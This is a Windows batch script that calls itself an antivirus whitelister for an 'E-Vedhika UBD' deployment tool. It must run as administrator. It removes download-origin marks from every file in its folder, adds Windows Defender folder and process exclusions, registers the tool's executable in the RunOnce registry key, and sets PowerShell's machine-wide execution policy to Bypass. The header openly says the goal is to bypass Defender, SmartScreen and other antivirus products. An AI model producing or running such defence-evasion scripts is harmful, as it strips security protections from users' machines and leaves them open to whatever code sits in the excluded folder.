@echo off
:: E-Vedhika UBD Deployment Tool - Antivirus Whitelist & False Positive Auto-Unblocker
:: Run as Administrator to bypass Windows Defender, SmartScreen, QuickHeal, NPAV & Kaspersky blocks

title E-Vedhika Antivirus Auto-Whitelister & SmartScreen Bypass
color 0A

echo ===========================================================================
echo   E-VEDHIKA UBD DEPLOYMENT TOOL - ANTIVIRUS & SMARTSCREEN WHITELISTER
echo ===========================================================================
echo.

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Elevated Administrator Privileges Required!
    echo Please right-click this script and select "Run as Administrator".
    echo.
    pause
    exit /b 1
)

echo [1/4] Unblocking downloaded ZIP and EXE files (Removing Zone.Identifier)...
powershell -Command "Get-ChildItem -Path '.' -Recurse | Unblock-File -ErrorAction SilentlyContinue"
powershell -Command "Get-ChildItem -Path 'C:\EVedhikaUBD' -Recurse | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1

echo [2/4] Adding Folder Exclusions to Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%CD%' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\EVedhikaUBD' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionProcess 'EVedhikaUBDDeploymentTool.exe' -ErrorAction SilentlyContinue"
powershell -Command "Add-MpPreference -ExclusionProcess 'EVedhikaAutoRepair.exe' -ErrorAction SilentlyContinue"

echo [3/4] Configuring Registry Trust for EVedhika Binaries...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "EVedhikaTrusted" /t REG_SZ /d "%CD%\EVedhikaUBDDeploymentTool.exe" /f >nul 2>&1

echo [4/4] Setting PowerShell ExecutionPolicy to Bypass...
powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force -ErrorAction SilentlyContinue"

echo.
echo ===========================================================================
echo [SUCCESS] E-Vedhika has been added to Windows Defender and System Exclusions!
echo You can now launch EVedhikaUBDDeploymentTool.exe without any Antivirus block.
echo ===========================================================================
echo.
pause
